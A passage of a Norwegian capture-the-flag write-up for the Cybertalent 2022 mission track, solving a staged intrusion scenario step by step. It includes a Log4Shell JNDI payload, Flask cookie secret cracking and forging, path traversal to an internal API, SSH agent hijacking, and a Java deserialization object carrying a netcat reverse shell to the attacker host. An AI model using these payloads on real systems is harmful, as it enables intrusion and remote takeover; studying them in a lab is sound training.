# Cybertalent-2022

Cybertalent er en årlig CTF holdt av Etteretningstjenesten. Den varer normalt i én måned, og inneholder 3 kategorier:
1. Grunnleggende
2. Oppdrag
3. Utfordringer

Denne writeup'en tar for seg oppdraget. Konteksten rundt oppdraget vil du finne [her](context).

---

## 2_01 - pcap_fil

Vi har mottatt ei [PCAP-fil](context/COMPROMISE_PWR-WS-CAF5DB.pcap) med nettverkstraffik fra angrepet.
Når vi åpner den i Wireshark er det en HTTP pakke som skiller seg ut:

```text
GET / HTTP/1.1
Host: pwr-07-ws-caf5db
Accept: */*
X-Flag: caf5db3e4479b9c3dcb91e43ef9aa497
User-Agent: ${jndi:ldap://10.0.30.98:1389/Basic/Command/Base64/ZWNobyBzc2gtZWQyNTUxOSBBQUFBQzNOemFDMWxaREkxTlRFNUFBQUFJTVRnYnlrZW1wZEFaNEZhaHpMUit0c2NrdFNsaUt0RWR3Wk9sWllXQkhxQyA%2bPiAuc3NoL2F1dGhvcml6ZWRfa2V5cw==}
```

Den inneholder både et flagg og en indikator på en utnyttelse av en Log4J-svakhet. Vi kommer tilbake til sistnevnte for 2.06.

```text
Kategori: 2. Oppdrag
Oppgave:  2.01_pcap
Svar:     caf5db3e4479b9c3dcb91e43ef9aa497
Poeng:    10

Gratulerer, korrekt svar!
```

---

## 2.02_anvilnotes

[INTREP](context/INTREP.txt) gir oss en pekepinne mot en nettside som kan nås på ANVILNOTES.CYBERTALENT.NO.
Dette fremstår som en helt vanlig nettside hvor man kan lage bruker, logge inn, og lagre notater i skyen.

Om vi lager en testbruker og lager et notat, så kan vi se at hvert notat får en mangesifret unik ID. 
Utifra dette begynte jeg å se etter *Insecure Direct Object References* (IDOR), og kom frem til at https://anvilnotes.cybertalent.no/note/1 gir oss tilgang til et notat skrevet av admin. 
Dette notatet innholder et flagg, og mulige hint om veien videre:

```text
FLAGG: 4aee8b5ccff539d35e7c8d6a1d749e1b

Development status:
☑ Figure out a way to generate PDFs securely!
☑ Make IT department fix firewall rules for the internal API
☑ Randomize note ids to prevent enumeration
☐ VIM keybindings
☐ Secure flask token using military grade encryptions that can't be unsigned using open software.
☐ Enable PDF feature for all users
```

```text
Kategori: 2. Oppdrag
Oppgave:  2.02_anvilnotes
Svar:     4aee8b5ccff539d35e7c8d6a1d749e1b
Poeng:    10

Admin sine notater, som han laget før id ble randomisert...
Gir dette noen hint til hvordan du kan få mer tilgang?
```

---

## 2.03_anvilnotes_admin

I notatene til admin står følgende:
`☐ Secure flask token using military grade encryptions that can't be unsigned using open software.`

Basert på det, så googlet jeg `flask token exploit github`.
Da fikk jeg opp denne som fjerdevalg: https://github.com/Paradoxis/Flask-Unsign

Bruken av verktøyet er ganske rett frem, og hvordan/hvorfor det funker står best forklart på GitHub'en.

```bash
pip3 install flask-unsign[wordlist]
flask-unsign --unsign --cookie "eyJ1c2VybmFtZSI6ImEifQ.Y7HYAw.1tPvb-GFYM6W4EWgbaJELRAZy7k"
# [*] Session decodes to: {'username': 'a'}
# [*] No wordlist selected, falling back to default wordlist..
# [*] Starting brute-forcer with 8 threads..
# [*] Attempted (2176): -----BEGIN PRIVATE KEY-----.m2
# [*] Attempted (2560): /-W%/egister your app with Twi
# [*] Attempted (4224): 5#y2LF4Q8z8a52f30af11409c74288
# [*] Attempted (31104): -----BEGIN PRIVATE KEY-----S_K
# [+] Found secret key after 35712 attemptsYRjlMjM1k45F
# 'This is an UNSECURE Secret. CHANGE THIS for production environments.'
```

Dette gir oss hemmeligheten som ble brukt for å signere JWT. Vi kan gjenbruke denne for å signere en ny JWT hvor vi er admin:

```bash
flask-unsign --cookie '{"username": "admin"}' --secret "This is an UNSECURE Secret. CHANGE THIS for production environments." --sign
# eyJ1c2VybmFtZSI6ImFkbWluIn0.Y7HcuQ.fIhMwTA2wkD3L0lphwKfic0mKqA
```
Vi kan da bytte ut vår JWT med overnevnte og navigere til https://anvilnotes.cybertalent.no/notes for å motta neste flagg.

```text
Kategori: 2. Oppdrag
Oppgave:  2.03_anvilnotes_admin
Svar:     071f24b786f392f3657fe7bbf5491e80
Poeng:    10

Som admin har du kanskje tilgang til mer funksjonalitet?
```

---

## 2.04_anvilnotes_password

Som admin har vi nå tilgang til "Save as PDF"-funksjonaliteten.

Jeg brukte Burp Suite for å inspisere nettverkstrafikken, og lærte at `/genpdf` endepunktet mottok en notat-ID via `id`-parameteret, og returnerte en PDF ved å bruke HTML-til-PDF programvaren `Werkzeug/2.2.2`.
Tidligere versjoner av Werkzeug har vært sårbar for *Server Side Template Injection*, men jeg klarte ikke å utnytte dette. 
Etterhvert kikket jeg etter *Local File Inclusion* via `id`-parameteret, og fant ut at `id=../../` avslører det interne API'et som ble nevnt i [notatet](#202_anvilnotes) til admin:

```yaml
{
    "definitions": {},
    "info": {
        "title": "Cool product name",
        "version": "0.0.0"
    },
    "paths": {
        "/api/decrypt": {
            "get": {
                "description": "",
                "parameters": [
                    {
                        "in": "GET(urlargs) or POST(body)",
                        "name": "data",
                        "required": true,
                        "type": "hex string"
                    }
                ],
                "produces": [
                    "plaintext string"
                ],
                "responses": {},
                "summary": "Decrypt our data with secret internal key"
            },
            "post": {
                "description": "",
                "parameters": [
                    {
                        "in": "GET(urlargs) or POST(body)",
                        "name": "data",
                        "required": true,
                        "type": "hex string"
                    }
                ],
                "produces": [
                    "plaintext string"
                ],
                "responses": {},
                "summary": "Decrypt our data with secret internal key"
            }
        },
        "/api/encrypt": {
            "post": {
                "description": "",
                "parameters": [
                    {
                        "in": "body",
                        "name": "data",
                        "required": true,
                        "type": "string"
                    }
                ],
                "produces": [
                    "hex string"
                ],
                "responses": {},
                "summary": "Encrypts data with secret internal key"
            }
        },
        "/api/user/{user}": {
            "get": {
                "description": "",
                "parameters": [
                    {
                        "in": "path",
                        "name": "<username>",
                        "required": true,
                        "type": "path"
                    }
                ],
                "produces": [
                    "application/json"
                ],
                "responses": {},
                "summary": "Get information from the database on a user. example: /api/user/bob"
            }
        },
        "/api/users": {
            "get": {
                "description": "",
                "produces": [
                    "application/json"
                ],
                "responses": {},
                "summary": "List all users from database."
            }
        }
    },
    "swagger": "2.0"
}
```

Jeg brukte da Repeater-funksjonaliteten i Burp for å utforske API'et:
```bash
id=../users
# ["a","admin","Benjamin","Brian","Cynthia","Frank","George","Henry","Jason","Julia","Karen","Laura","Marilyn","Mark","Mary","Olivia","oper","Richard","Russell","Samuel","Sharon","Stephen","Theresa"]

id=../user/oper
# {"password":"83105903c96feecb4e2fce49379af0b5f4e140533d2f216d2cc617d210eec4fbebbdcd4a3c6202b1f285420146edc8ed72ce3166e8806cdf2cf3d290630741f598b2d34bac5048","username":"oper"}
```

Passordet ser ikke ut til å passe noe slags hash-format som jeg er bekjent, og hvis man sammenligner den med de andre brukerne så er lengden varierende.
Det vil da hinte til at det er kryptert, ikke hashet.

API'et har dekrypteringsfunksjonalitet, så vi kan benytte det i henhold til beskrivelsen som ble gitt:

```bash
id=../decrypt?data=83105903c96feecb4e2fce49379af0b5f4e140533d2f216d2cc617d210eec4fbebbdcd4a3c6202b1f285420146edc8ed72ce3166e8806cdf2cf3d290630741f598b2d34bac5048
# FLAGG: ed9e224f5a359543420928d1ed1a8ca8
```

Ser ut som om passordet til `oper` er `FLAGG: ed9e224f5a359543420928d1ed1a8ca8`. Det er beleilig.

```text
Kategori: 2. Oppdrag
Oppgave:  2.04_anvilnotes_password
Svar:     ed9e224f5a359543420928d1ed1a8ca8
Poeng:    10

Hvis aktøren har benyttet denne tjenesten finner vi kanskje noen interessante notater.
```

---

## 2.05_anvilnotes_source

Hvis vi logger på med brukernavn og passord nevnt ovenfor så finner vi to notater:

```text
Backup of client source code	
Backup of server source code
```

Flagget ligger i notatene, sammen med den Base-64-kodet kildekoden for klienten/serveren til skadevaren.
Jeg brukte [denne](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Gunzip()Untar()) oppskriften i Cyberchef for å pakke den ut.

```text
Kategori: 2. Oppdrag
Oppgave:  2.05_anvilnotes_source
Svar:     eacad6dfaadb1b0420dc17b6560b89de
Poeng:    10

Dette så interessant ut!
En samarbeidende tjeneste i Pseudova vurderer at dette meget sannsynlig er kildekoden for skadevaren benyttet i angrepene mot kraftverket deres.
```

---

## 2.06_pwr-ws-caf5db

En rask nmap skann av subnettet avslører at serveren med Log4J-sårbarheten fortsatt er tilgjengelig:

```bash
nmap -sn 10.0.236.101/27
# Nmap scan report for 0e7e17e3605aa2385b923dbd549531e4_pwr-ws-caf5db.1.4gpt2qoq7daix109e09sese50.0e7e17e3605aa2385b923dbd549531e4_backend (10.0.236.102)
# Host is up (0.0076s latency).
```

Da jeg tidligere har utnyttet Log4J så har jeg hatt best erfaring med [dette](https://github.com/zzwlpx/JNDIExploit) Github repositoret. `JNDIExploit.jar`-fila er ikke tilgjengelig der lengre, men kan finnes [her](https://github.com/black9/Log4shell_JNDIExploit).

I angrepet vi observerte i pcap-fila var sårbarheten i User-Agent headeren. Utnyttelsen blir derfor slik:

```bash
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i corax &
nc -lvnp 4444 &
curl pwr-ws-caf5db -A '${jndi:ldap://corax:1389/Basic/ReverseShell/corax/4444}'
fg
```

Om alt gikk bra vil vi få et shell. Flagget ligger godt synlig i hjemmemappen.

```text
Kategori: 2. Oppdrag
Oppgave:  2.06_pwr-ws-caf5db
Svar:     74320a680cc9edc8d1f7a9a4a5c613dc
Poeng:    10

Det later til at skadevaren fortsatt kjører. Finn flere spor etter aktøren, og søk å skaffe aksess videre inn i infrastrukturen deres.

Brukeren har også privatnøkkel for ssh-tilgang til sin egen maskin. Jeg legger en kopi i oppdragsmappen din for lettere tilgang senere.

Ny fil: /home/login/2_oppdrag/sshkey_pwr-ws-caf5db
```

---

## 2.07_shady-aggregator

Om vi bruker `ps -aux` for å liste prosessene som kjører ser vi en interessant SSH forbindelse:
```text
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2236   432 ?        Ss   Jan09   0:00 /sbin/init
user          10  0.1  0.7 2542548 58716 ?       Sl   Jan09   2:08 /usr/bin/java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -jar /usr/share/java/api-server.jar
root          36  0.0  0.0  13348  3088 ?        Ss   Jan09   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root         206  0.0  0.0  14712  6440 ?        Ss   Jan09   0:00 sshd: user [priv]
user         212  0.0  0.0  15032  4356 ?        S    Jan09   0:00 sshd: user@pts/0
user         213  0.0  0.0 1116108 5320 pts/0    Ssl  Jan09   0:00 -fish
user         463  0.0  0.0   9100  2232 ?        Ss   Jan09   0:00 ssh: /home/user/.ssh/cp/archive@shady-aggregator_737236436b188023edcd4d77faeb428ba6e6f708 [mux]
user         566  0.0  0.6 2330464 52872 pts/0   Sl+  Jan09   1:54 java -jar .client
root       34448  0.2  0.1  14716  8940 ?        Ss   17:05   0:00 sshd: user [priv]
user       34454  0.0  0.0  15036  6048 ?        S    17:05   0:00 sshd: user@pts/1
user       34455  0.6  0.0 239508  7784 pts/1    Ssl  17:05   0:00 -fish
user       34549  0.0  0.0   6988  3104 pts/1    R+   17:05   0:00 ps -aux
```

Brukeren `archive` fra maskinen `shady-aggregator` har en aktiv SSH forbindelse med *Agent Forwarding* til våres bruker. Dette kan vi [utnytte](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/ssh-forward-agent-exploitation):

```bash
ls -la /tmp/ssh-njl06sp7u2/agent.203 
# srwxr-xr-x 1 user user 0 Dec 31 22:33 /tmp/ssh-njl06sp7u2/agent.203=
SSH_AUTH_SOCK=/tmp/ssh-njl06sp7u2/agent.203 ssh archive@shady-aggregator
whoami
# archive
cat FLAGG
# FLAGG: 8f1e081e605843164b5efc848c12696a
```

```text
Kategori: 2. Oppdrag
Oppgave:  2.07_shady-aggregator
Svar:     8f1e081e605843164b5efc848c12696a
Poeng:    10

Utmerket! Denne maskinen administrerer et botnett.

Det burde være mulig å hoppe videre til de andre enhetene som kontrolleres.
```

---

## 2.08_client_list

Ref. outputtet fra `ps -aux` på [2.07](#207_shady-aggregator) så ser at det er en klient kjørende på maskinen: `java -jar .client` 

```bash
find / -name ".client" 2>/dev/null
# /tmp/.tmp/.client
ls -la /tmp/.tmp/
# -rw-r--r-- 1 user user 11258 Dec 18 22:02 .client
# -rw-r--r-- 1 user user   202 Jan  1 22:43 .config
# -rw-r--r-- 1 user user    22 Jan  1 22:43 .output
strings /tmp/.tmp/.config 
# utils.Config$0
# sleepDurationL
# Ljava/lang/String;L
# pendingCommandst
# Ljava/util/ArrayList;L
#         serverURLq
# xpwA
# 42FD29AED93B779C
# %http://shady-aggregator.utl/f52e6101/
```

Den URL'en ser veldig suspekt ut. En rask rekognosering med `gobuster` gir oss dette:

```bash
gobuster dir -u http://shady-aggregator.utl/f52e6101/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# ===============================================================
# Gobuster v3.4
# by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
# ===============================================================
# [+] Url:                     http://shady-aggregator.utl/f52e6101/
# [+] Method:                  GET
# [+] Threads:                 10
# [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# [+] Negative Status codes:   404
# [+] User Agent:              gobuster/3.4
# [+] Timeout:                 10s
# ===============================================================
# 2023/01/01 13:37:00 Starting gobuster in directory enumeration mode
# ===============================================================
# /list               (Status: 200) [Size: 1029] 

curl http://shady-aggregator.utl/f52e6101/list
# ID               | NAME                             | LAST CHECKIN
# -----------------+----------------------------------+--------------------
# 42FD29AED93B779C | pwr-ws-caf5db                    | 2023-01-01 23:45:02
# DEADBEEFDEADBEEF | test-3                           | 2023-01-01 23:45:01
# 18F53CE5F533ACF7 | aurum                            | 2023-01-01 23:44:37
# FLAGG            | 260c54fac22eb752739f2978fff9e021 | 2022-11-30 17:48:21
# 6ED230A80172B12E | pwr-ws-72fed1                    | 2022-11-16 11:00:32
# F7D79C0F8995E423 | pwr-ws-64ca70                    | 2022-11-07 09:07:29
# 58A5FCF9FB1712B7 | pwr-ws-6d5602                    | 2022-06-30 01:47:58
# 93B58D54A5DB772A | pwr-ws-b5747c                    | 2022-06-11 17:25:14
# CAFEBABECAFEBABE | test-2                           | 2022-02-23 08:06:40
# 46E894E2BEC4BD46 | pwr-ws-a8a1ce                    | 2022-02-06 22:53:02
# 14B6A84F08AC6887 | pwr-ws-e3fb32                    | 2022-01-27 17:24:04
# DEADC0DEDEADC0DE | test-1                           | 2021-12-20 12:33:20
```

Legg merke til at `pwr-ws-caf5db`. `test-3` og `aurum` nylig har sjekket inn.

```text
Kategori: 2. Oppdrag
Oppgave:  2.08_client_list
Svar:     260c54fac22eb752739f2978fff9e021
Poeng:    10

En liste over alle de infiserte klientene deres?

Den test-instansen som fortsatt sjekker inn så spennende ut...
```

---

## 2.09_cloud-hq

Nå har vi tilgang til både `archive@shady-aggregator` og kildekoden for skadevaren som er i bruk. Scoreboard-teksten til 2.08 hinter mot den `test-3` instansen som sjekker inn hvert 10. sekund.

Det mest logiske er at det er en sårbarhet i skadevaren som vil gi oss tilgang til de som opererer skadevaren.
Dette fant jeg ikke med det første, så gravde meg ned i et kaninhull som endte med at jeg fikk tilgang til `c2`-brukeren på `shady-aggregator`, som var et flagg i umulig-kategorien. Det var gjennom en race condition -> SSTI, og gjennomgangen ligger [nederst](#3413_shady-aggregator_c2).

Men selv tilgang til brukeren som kjørte serveren var ikke det som måtte til for å få tilgang til skurkene. Hver en kommando som blir lastet opp og ned går gjennom en ECDSA signatursjekk, og implementasjonen virket nokså plettfri både på serveren og klienten i mine øyne.

Etter mye leting på nettet kom jeg over en sårbarhetskategori som heter Java Deserialization. Etter mange timers lesing gjennom slides og whitepapers på [denne](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#overview) GitHub'en så forstod jeg litt hvordan sårbarheten fungerte, og hvordan den kunne anvendes i denne situasjonen.

I Config.java er det en `readObject()` metode som håndterer hvordan et Config-objekt skal leses inn. 

`readObject()` er en standardmetode som er tilgjengelig i alle objekter som implementerer interfacet Serializable, men den kan også defineres manuelt av utvikleren. 
Dette kan være nyttig for å implementere ytterligere logikk for gjenoppretting av objekter.

I denne ser vi at den går gjennom alle `pendingCommands`, og kjører de hvis tiden er inne. Dette skjer da altså uten noe som helst verifikasjon gjennom ECDSA.

```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {

    id = ois.readUTF();
    sleepDuration = ois.readInt();
    serverURL = ois.readUTF();
    pendingCommands = new ArrayList<Command>();
    Instant now = Instant.now();
    int pendingCommandsSize = ois.readInt();
    for (int i = 0; i < pendingCommandsSize; i++) {
        Command c = (Command) ois.readObject();
        if (c.runAfter.isBefore(now))
            c.execute(System.out, this);
        else
            pendingCommands.add(c);
    }
}
```

Klienten mottar kommandoer gjennom `checkInWithC2()` funksjonen i `Client.java`, mer spesifikt disse to linjene:

```java
ObjectInputStream in = new ObjectInputStream(conn.getInputStream());
Command c = (Command) in.readObject();
```

Selv om det mottatte objektet blir kastet til et `Command` object, så vil `readObject()` bli eksekvert før dette.
Det spiller da ingen rolle om denne kastingen feiler, vi bryr oss bare om hva som skjer i `readObject()`.

For å lage det ondsinnede Config-objektet så modifiserte jeg `Client.java` fra kildekoden:

```java
public static void make_config() {

    Command maliciousCommand = new commands.Execute();
    maliciousCommand.recipient = "DEADBEEFDEADBEEF";
    maliciousCommand.runAfter = Instant.now();
    maliciousCommand.value = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc corax 4444 >/tmp/f";

    Config maliciousConfig = new Config();
    maliciousConfig.id = "DEADBEEFDEADBEEF";
    maliciousConfig.serverURL = "http://vg.no";
    maliciousConfig.sleepDuration = 69;
    maliciousConfig.pendingCommands.add(maliciousCommand);

    try {
        FileOutputStream fos = new FileOutputStream("malicious_config");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(maliciousConfig);
        oos.close();
        fos.close();
    } catch (IOException e) {
        e.printStackTrace();
    }
}

public static void main(String[] args) {

    make_config();
    System.exit(0);
}
```

Dette gir oss `malicious_config`, som vi skal bruke videre.
Gjorde et par endringer til mens jeg prøvde å forstå meg på objektene som ble benyttet i skadevaren. Disse påvirker ikke oppdraget, men du finner de [her](c2_scripts/modified_client_source).

Neste steg var å legge til objektet i kommando-databasen til c2-serveren, slik at `test-3` klienten hentet det under neste innsjekk. Heldigvis hadde jeg direkte tilgang til sqlite3 databasen gjennom `c2` brukeren, så denne problemstillingen slapp jeg å tenke på. :innocent: Lagde et [skript](c2_scripts/add_command_to_db.py) for å gjøre dette.

```bash
nc -lvnp 4444 &
scp -i 2_oppdrag/sshkey_c2@shady-aggregator malicious_config c2@shady-aggregator:
ssh -i 2_oppdrag/sshkey_c2@shady-aggregator c2@shady-aggregator
cd app
ls -l
# drwxr-xr-x 2 c2 c2    69 Jan 11 14:51 __pycache__
# -rw-r--r-- 1 c2 c2 73728 Jan 11 15:53 db.sqlite3
# -rw-r--r-- 1 c2 c2    64 Dec  2 14:47 gunicorn.conf.py
# -rwxr-xr-x 1 c2 c2  8594 Dec 20 14:55 main.py
# drwxr-xr-x 1 c2 c2    81 Nov 30 13:23 templates
python3 add_command_to_db.py DEADBEEFDEADBEEF 1 ../malicious_config
exit
fg
whoami
# oper
uname -a
# Linux cloud-hq-79 5.4.0-1094-azure #100~18.04.1-Ubuntu SMP Mon Oct 17 11:44:30 UTC 2022 x86_64 GNU/Linux
cat /home/oper/FLAGG
# FLAGG: 80e125e2403402c9486c94eb3b276482
```

```text
Kategori: 2. Oppdrag
Oppgave:  2.09_cloud-hq
Svar:     80e125e2403402c9486c94eb3b276482
Poeng:    10

Det er noe veldig tilfredstillende med å utnytte sårbarheter i skadevare.

Dette ser ut som operatøren bak angrepet mot kraftverket. Jeg legger ssh-nøkkelen hans i oppdragsmappen din mens du går gjennom koden som ligger her.

Ny fil: /home/login/2_oppdrag/sshkey_cloud-hq
```

---

## 2.10_infrastruktur

På `cloud-hq-79` finner vi den komplette kildekoden til skadevaren i `/home/oper/src`. Blant denne ligger det en fil kalt `GenCommand.java`. Dette er koden som ble brukt for å generere kommandoer, og inni den ligger det et vakkert flagg:

```java
static String FLAG = "c4381f44298bb0dede6c185dc2406a40";
```

```text
Kategori: 2. Oppdrag
Oppgave:  2.10_infrastruktur
Svar:     c4381f44298bb0dede6c185dc2406a40
Poeng:    10

Vi har nå god kontroll på Utlandias infrastruktur for cyberoperasjoner.

Vi mangler fortsatt informasjon om det gamle regimets planer. Informasjonen du har samlet inn vil bli overlevert til våre analytikere som vil sammenstille en rapport. Rapporten vil legges i oppdragsmappen din på corax så snart det lar seg gjøre.

Forbered for fremtidige operasjoner og avvent ytterligere ordre.

Ny fil: /home/login/2_oppdrag/INTREP-2.txt
```

---

## 2.11_aurum_shell

Vi bruker samme utnyttelse som for [2.09](#209_cloud-hq), men bytter ut ID'en til `aurum` sin.
Flagget ligger godt synlig i hjemmemappen.

```text
Kategori: 2. Oppdrag
Oppgave:  2.11_aurum_shell
Svar:     4ad7dab1e6231e8903985e5ea70cf4dc
Poeng:    3

Hva brukes denne maskinen til?

Ny fil: /home/login/2_oppdrag/sshkey_aurum
```

---

## 2.12_missile_targets

En naturlig ting å gjøre i et nytt miljø er å sjekke hva som er blitt gjort før. Dette forteller `history` kommandoen oss:

```bash
1  ls -lah
2  which signer
3  signer --help
4  echo "Testing testing" > test.txt && signer --file-name test.txt --key-file privkey.pem --rng-source urandom
5  rm test.txt
6  konekt
7  signer --file-name missile.1.3.37.fw --key-file privkey.pem --rng-source urandom
8  mv missile.1.3.37.fw_signed missile.1.3.37.fw
9  konekt
10 rm privkey.pem missile.1.3.37.fw
```

`signer` og `konekt` er ikke-standard kommandoer, og fortjener litt videre utforskning.

Når vi kjører `konekt` blir vi møtt av følgende meny.

```text
╒══════════════════════════════════════════════════════════════════════════════╕
│                                                                         MAIN │
╞══════════════════════════════════════════════════════════════════════════════╡
│ p: program                                                                   │
│ m: missile                                                                   │
│ f: firmware                                                                  │
│ u: user                                                                      │
└──────────────────────────────────────────────────────────────────────────────┘
```

Om vi velger `missile` -> `list submarines with missiles` får vi følgende liste:

```text
╒══════════════════════════════════════════════════════════════════════════════╕
│                                                list submarines with missiles │
╞══════════════════════════════════════════════════════════════════════════════╡
│ sub | missile | __tof__ | ____________.____target___.____________ | checksum │
│ ----+---------+---------+-------------+-------------+-------------+--------- │
│   1 |       1 | 1080.00 |  3965173.80 |    -8172.61 |  4986679.35 | ill-buzz │
│   1 |       2 | 1080.00 |  3877218.23 |  -128524.04 |  5053741.33 | tan-city │
│   1 |       3 | 1080.00 |  3788140.78 |  -148481.80 |  5120310.89 | any-fang │
│   1 |       4 | 1080.00 |  3793400.39 |  -197697.20 |  5114750.27 | six-crop │
│   1 |       5 | 1080.00 |  3761259.92 |  -101682.56 |  5141228.01 | few-darn │
│   1 |       6 | 1200.00 |  3565283.98 |  -265059.37 |  5273341.89 | its-folk │
│   1 |       7 | 1200.00 |  3561474.41 |  -199048.12 |  5278818.14 | wry-cook │
│   1 |       8 | 1000.00 |  3798982.34 |   -97495.01 |  5113498.70 | few-area │
│   1 |       9 | 1080.00 |  3780277.58 |  -415086.43 |  5111442.62 | bad-dime │
│   1 |      10 | 1100.00 |  3904518.71 |   292813.87 |  5025796.92 | day-acid │
│   1 |      11 |  500.00 |  4517609.64 |   -45797.26 |  4492076.00 | bad-dory │
│   1 |      12 | 1300.00 |  3931251.08 |   515136.93 |  4986936.93 | her-chin │
│   1 |      13 |  900.00 |  4840420.30 |  -313337.46 |  4130592.21 | the-clue │
│   1 |      14 | 1080.00 |  3978633.52 |   306311.28 |  4966516.86 | sly-chug │
│   1 |      15 | 1500.00 |  3771037.60 |   898732.45 |  5055808.19 | one-epee │
│   1 |      16 | 1200.00 |  4629467.70 |  1026020.23 |  4254991.45 | top-game │
│ ----+---------+---------+-------------+-------------+-------------+--------- │
│   2 |       1 | 2000.00 |  2871529.36 |  1335712.45 |  5528094.82 | fat-blow │
│   2 |       2 | 1400.00 |  3916904.74 |   305684.71 |  5015381.85 | coy-drug │
│   2 |       3 | 1100.00 |  3506335.17 |   781724.52 |  5261574.05 | new-bore │
│   2 |       4 | 1300.00 |  4187571.65 |   171778.44 |  4798372.31 | top-draw │
│   2 |       5 | 2000.00 |  4073672.03 |  1196123.56 |  4750171.12 | hot-blow │
│   2 |       6 | 1800.00 |  3642005.91 |  1399313.87 |  5036601.50 | sea-axis │
│   2 |       7 | 1100.00 |  3727617.22 |   656855.67 |  5124748.92 | ten-bank │
│   2 |       8 | 2100.00 |  4068863.73 |  1404219.05 |  4697037.13 | new-epic │
│   2 |       9 | 2000.00 |  4776300.55 |   179647.34 |  4212400.85 | icy-beat │
│   2 |      10 | 1800.00 |  4165201.60 |   853184.42 |  4744766.90 | odd-cyst │
│   2 |      11 | 1500.00 |  3089215.84 |  1007518.11 |  5480081.55 | own-axis │
│   2 |      12 | 1600.00 |  4038925.22 |   616753.05 |  4888388.26 | fat-dirt │
│   2 |      13 | 1300.00 |  3137883.12 |   596195.86 |  5512520.39 | six-fill │
│   2 |      14 | 2000.00 |  3960132.01 |  1018155.11 |  4885729.80 | two-comb │
│   2 |      15 | 1600.00 |  4144099.14 |   669960.54 |  4792414.44 | own-chop │
│   2 |      16 | 2000.00 |  3824498.89 |  1172080.09 |  4958737.49 | raw-coke │
│ ----+---------+---------+-------------+-------------+-------------+--------- │
│   3 |       1 | 1500.00 |  4410958.41 |   713514.00 |  4541363.75 | odd-fine │
│   3 |       2 | 1300.00 |  4299765.90 |  1853546.05 |  4320419.11 | the-fact │
│   3 |       3 | 1900.00 |  3985471.63 |   486043.26 |  4946657.34 | fat-dawn │
│   3 |       4 |  600.00 |  4669514.06 |  1190727.92 |  4167426.84 | sly-foal │
│   3 |       5 | 1900.00 |  3874979.79 |   332003.34 |  5046181.37 | bad-clef │
│   3 |       6 | 1600.00 |  4616563.98 |   433955.07 |  4369057.23 | wee-beet │
│   3 |       7 | 1000.00 |  4446250.49 |   604524.44 |  4522725.70 | one-dirt │
│   3 |       8 | 1700.00 |  3845603.32 |  1395471.42 |  4884018.39 | icy-bias │
│   3 |       9 | 1700.00 |  4918271.64 |   -32190.47 |  4049593.66 | sea-cafe │
│   3 |      10 | 1000.00 |  4269110.60 |  1221452.38 |  4568631.07 | tan-burn │
│   3 |      11 | 2000.00 |  5034046.16 |  -528572.99 |  3868931.49 | cut-cyst │
│   3 |      12 | 1800.00 |  4759979.88 |   -73754.64 |  4234004.35 | few-case │
│   3 |      13 | 1700.00 |  3718215.79 |  1313565.45 |  5003904.29 | wee-boss │
│   3 |      14 | 1080.00 |  4085093.56 |  2000940.11 |  4460705.13 | two-fork │
│   3 |      15 | 1900.00 |  3961278.75 |   471185.24 |  4967483.89 | all-area │
│   3 |      16 |  600.00 |  4876635.39 |  1158780.74 |  3932593.98 | shy-chip │
│ ----+---------+---------+-------------+-------------+-------------+--------- │
│   4 |       1 | 2200.00 |  4597051.62 |  2020600.46 |  3920960.49 | hot-beat │
│   4 |       2 | 2000.00 |  3171884.46 |  1419189.87 |  5339914.80 | all-colt │
│   4 |       3 | 1600.00 |  3887682.95 |   851924.98 |  4974915.69 | fun-babe │
│   4 |       4 | 1700.00 |  3329463.78 |   706154.41 |  5385690.11 | new-bear │
│   4 |       5 | 1300.00 |  4611888.79 |   116255.99 |  4393928.46 | the-copy │
│   4 |       6 | 1100.00 |  3865581.56 |   -76231.47 |  5063705.07 | old-bass │
│   4 |       7 | 1400.00 |  4570639.43 |   584655.32 |  4399667.53 | low-diet │
│   4 |       8 | 1100.00 |  3670172.41 |  -380922.31 |  5193685.94 | few-babe │
│   4 |       9 | 1500.00 |  3940686.48 |   484402.33 |  4982568.16 | due-edge │
│   4 |      10 | 1600.00 |  5091632.09 |  -393567.62 |  3809203.09 | icy-alto │
│   4 |      11 | 2000.00 |  3330020.22 |  1572646.72 |  5198787.23 | wee-gene │
│   4 |      12 | 1550.00 |  3782049.34 |   585606.67 |  5093408.35 | two-fate │
│   4 |      13 | 1600.00 |  4496095.57 |   707789.04 |  4458004.07 | hot-coin │
│   4 |      14 | 1600.00 |  3890478.06 |   951077.25 |  4954722.35 | red-chef │
│   4 |      15 | 1500.00 |  4907473.21 |  -789505.95 |  3985351.69 | key-debt │
│   4 |      16 | 1750.00 |  3718324.97 |  1131497.77 |  5048109.87 | key-geek │
│ ----+---------+---------+-------------+-------------+-------------+--------- │
│   5 |       1 | 2000.00 |  3833839.73 |   657618.26 |  5045676.58 | big-bone │
│   5 |       2 | 1300.00 |  4428743.04 |   374560.24 |  4564600.82 | bad-chug │
│   5 |       3 | 1700.00 |  4063995.57 |   794515.12 |  4841727.66 | few-beam │
│   5 |       4 | 1600.00 |  3944256.52 |   467894.59 |  4981320.73 | due-coat │
│   5 |       5 | 2000.00 |  3516587.05 |  1186080.23 |  5178462.15 | her-cash │
│   5 |       6 | 2000.00 |  4062712.85 |  1250376.84 |  4745583.53 | icy-fate │
│   5 |       7 | 1100.00 |  5019970.12 |   -99074.77 |  3921699.27 | sad-bend │
│   5 |       8 | 2200.00 |  2941903.82 |  1356458.76 |  5485878.47 | two-fill │
│   5 |       9 | 1100.00 |  4905851.41 |   227075.15 |  4058411.00 | coy-boat │
│   5 |      10 | 1800.00 |  3674173.23 |   953834.06 |  5116668.12 | dry-epic │
│   5 |      11 | 1400.00 |  4455748.78 |   894105.71 |  4465032.90 | its-bulb │
│   5 |      12 |  600.00 |  4898728.76 |  -809920.21 |  3992007.87 | mad-bulb │
